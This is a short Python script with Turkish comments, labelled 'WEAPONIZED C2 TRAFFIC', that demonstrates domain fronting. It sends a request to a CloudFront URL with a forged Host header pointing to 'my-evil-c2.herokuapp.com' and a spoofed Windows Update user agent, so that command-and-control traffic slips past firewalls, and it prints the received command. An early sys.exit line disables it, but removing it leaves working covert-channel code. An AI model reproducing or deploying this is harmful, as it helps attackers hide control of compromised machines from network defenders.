import requests
import sys

# --- EMNİYET PİMİ ---
sys.exit("UYARI: Bu kod Domain Fronting tekniği kullanır.")

print("--- WEAPONIZED C2 TRAFFIC ---")

def connect_c2_hidden():
    # 1. HEDEF GÖRÜNÜMÜ (Weaponized Part)
    # Simülasyon: url = "http://192.168.1.5:4444"
    # Gerçek: Trafik Amazon CDN'e gidiyor gibi görünür.
    
    # Bu domain "Clean" (Güvenilir) domaindir.
    cdn_url = "https://d12345.cloudfront.net/update" 
    
    # 2. GİZLİ YÖNLENDİRME (Host Header)
    # CDN sunucusu bu header'ı görünce paketi arkadaki bizim sunucuya atar.
    headers = {
        "Host": "my-evil-c2.herokuapp.com",
        "User-Agent": "Mozilla/5.0 (Windows Update)"
    }
    
    print(f"[*] İstek gönderiliyor: {cdn_url}")
    print(f"[*] Gizli Hedef: {headers['Host']}")
    
    # Firewall sadece 'cloudfront.net' görür ve izin verir.
    r = requests.get(cdn_url, headers=headers)
    
    print("💀 KOMUT ALINDI.")
    print(f"Cevap: {r.text[:50]}...")

if __name__ == "__main__":
    connect_c2_hidden()